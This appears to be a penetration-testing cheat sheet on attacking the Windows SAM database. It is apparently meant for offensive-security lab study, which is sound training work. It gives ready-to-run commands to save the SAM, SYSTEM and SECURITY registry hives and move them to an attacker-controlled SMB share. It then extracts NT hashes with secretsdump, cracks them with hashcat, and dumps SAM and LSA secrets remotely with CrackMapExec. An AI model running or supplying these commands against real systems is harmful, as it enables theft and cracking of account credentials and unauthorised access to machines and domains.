# Attacking SAM
```table-of-contents
```
## Registry Hives (SAM)
| **Registry Hive**   | **Description**                                                                      |
| --------------- | -------------------------------------------------------------------------------- |
| `HKLM\sam`      | Contains the hashes of local users.                                              |
| `HKLM\system`   | Contains the **Boot Key** (SysKey) required to decrypt the SAM database.         |
| `HKLM\security` | Contains **LSA Secrets** (cached domain credentials, service account passwords). |
## 1. Manual Dumping (Reg.exe)
```powershell
# Create a temp directory
mkdir C:\Temp
cd C:\Temp

# Save the hives
reg.exe save hklm\sam C:\Temp\sam.save
reg.exe save hklm\system C:\Temp\system.save
reg.exe save hklm\security C:\Temp\security.save
```
## 2. Exfiltration (Impacket SMBServer)
**Attack Box (Linux):** The `-smb2support` flag is critical for modern Windows targets (which disable SMBv1).
```shell
# Syntax: smbserver.py -smb2support <ShareName> <LocalPath>
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData $(pwd)
```
**Target (Windows):** Move the files to the attacker's share (IP `10.10.14.x` represents your attack IP).
```powershell
move C:\Temp\sam.save \\10.10.14.x\CompData
move C:\Temp\system.save \\10.10.14.x\CompData
move C:\Temp\security.save \\10.10.14.x\CompData
```
## 3. Extracting Hashes (Secretsdump)
```shell
# Syntax: secretsdump.py -sam <sam> -system <system> -security <security> LOCAL
python3 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
```
**Output format:** The tool outputs hashes in the format: `User:RID:LM:NT`. We are interested in the **NT hash** (the last part).
```txt
User:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
                                         ^ This is the NT Hash
```
## 4. Cracking Hashes (Hashcat)
Use Hashcat to crack the extracted NTLM hashes.
- **Mode:** `1000` (NTLM)
- **Input:** File containing just the hash (e.g., `31d6cfe0d16ae931b73c59d7e0c089c0`)
```shell
# 1. Save hashes to file
vim hashes.txt

# 2. Crack
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
```
## Remote Dumping (CrackMapExec)
If we already have valid credentials (User/Pass or Hash) for a Local Admin account, we don't need to manually upload/download files. We can dump credentials remotely using **CrackMapExec** (or NetExec).
### Dumping SAM (Local Accounts)
```shell
# Dump local account hashes
crackmapexec smb <target-IP> -u <User> -p <Password> --sam
```
### Dumping LSA Secrets
This extracts secrets stored by the Local Security Authority, which may include:
- Service Account passwords in cleartext.
- Cached Domain Credentials (MSCASH/MSCASH2).
- Scheduled task credentials.
```shell
# Dump LSA secrets
crackmapexec smb <target-IP> -u <User> -p <Password> --lsa
```